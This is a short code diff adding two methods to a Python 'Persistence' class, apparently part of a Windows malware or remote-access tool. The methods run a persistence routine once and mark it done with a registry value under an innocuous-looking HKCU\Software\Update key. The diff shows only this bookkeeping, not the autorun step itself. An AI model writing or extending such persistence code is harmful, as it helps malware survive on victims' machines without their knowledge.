@@ -32,3 +32,35 @@ class Persistence(object):
             return "Persistence deleted.\n"
         except:
             return 'There are some problems with deleting persistence!!!\n'
+
+    def doFirstPersistence(self):
+        REG_PATH = r'Software\Update'
+        REG_NAME = 'Persistece'
+
+        if self.checkFisrtPersistence():
+            try:
+                self.doPersistence()
+
+                _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
+                registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0,
+                                               _winreg.KEY_WRITE)
+                _winreg.SetValueEx(registry_key, REG_NAME, 0, _winreg.REG_SZ, '1')
+                _winreg.CloseKey(registry_key)
+
+            except WindowsError:
+                return
+        else:
+            return
+
+
+    def checkFisrtPersistence(self):
+        REG_PATH = r'Software\Update'
+        REG_NAME = 'Persistece'
+        try:
+            registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0,
+                                           _winreg.KEY_READ)
+            value = _winreg.QueryValueEx(registry_key, REG_NAME)
+            _winreg.CloseKey(registry_key)
+            return False
+        except WindowsError:
+            return True
